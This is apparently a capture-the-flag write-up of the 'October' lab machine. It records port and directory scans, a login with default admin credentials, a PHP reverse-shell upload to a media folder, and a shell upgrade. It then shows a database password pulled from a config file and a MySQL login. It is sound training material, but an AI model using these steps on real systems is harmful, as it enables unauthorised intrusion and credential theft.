@@ -1,0 +1,76 @@
+I start off with an nmap scan and a full port scan reveals only two ports open:
+└─# nmap -sC -sV -A 10.10.10.16
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
+|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
+|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
+|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-methods: 
+|_  Potentially risky methods: PUT PATCH DELETE
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: October CMS - Vanilla
+
+Then I follow swiftly after with a directory bruteforce:
+└─# gobuster dir -u http://10.10.10.16 -w /usr/share/wordlists/directory-list-2.3-medium.txt
+/blog                 (Status: 200) [Size: 4255]
+/forum                (Status: 200) [Size: 9598]
+/themes               (Status: 301) [Size: 310] [--> http://10.10.10.16/themes/]
+/modules              (Status: 301) [Size: 311] [--> http://10.10.10.16/modules/]
+/account              (Status: 200) [Size: 5089]                                 
+/tests                (Status: 301) [Size: 309] [--> http://10.10.10.16/tests/]  
+/storage              (Status: 301) [Size: 311] [--> http://10.10.10.16/storage/]
+/plugins              (Status: 301) [Size: 311] [--> http://10.10.10.16/plugins/]
+/backend
+
+When I visit the /backend am redirected to admin login page. I try admin : admin and I get logged in:
+http://10.10.10.16/backend/cms/media
+
+Now here I wish to upload a php reverse shell and see if I can get a reverse shell.
+http://10.10.10.16/storage/app/media/hello.php5
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@october:/$ cd home
+cd home
+www-data@october:/home$ ls
+ls
+harry
+www-data@october:/home$ cd harry
+cd harry
+www-data@october:/home/harry$ ls
+ls
+october-1.0.412.tar.gz	user.txt
+www-data@october:/home/harry$ cat user.txt
+cat user.txt
+29161ca87aa3d34929dc46efc40c89c0
+
+[+] Searching passwords in config PHP files
+            'password'  => 'OctoberCMSPassword!!',
+[+] Finding 'username' string inside key folders (limit 70)
+/var/www/html/cms/config/database.php:            'username'  => 'october',
+/var/www/html/cms/config/database.php:            'username' => 'root',
+Running netstat -ntulp, I notice mysql is listening on port 3306
+
+ 'mysql' => [
+            'driver'    => 'mysql',
+            'host'      => 'localhost',
+            'port'      => '',
+            'database'  => 'october',
+            'username'  => 'october',
+            'password'  => 'OctoberCMSPassword!!',
+            'charset'   => 'utf8',
+            'collation' => 'utf8_unicode_ci',
+            'prefix'    => '',
+        ],
+        
+  I try to login to mysql database to see if I can get anything:
+  mysql -u october -p : OctoberCMSPassword!!
+  
+  I login successfully but I obly find dummy users not really helpful there. I need to look deeper.
+  
+  
+
+
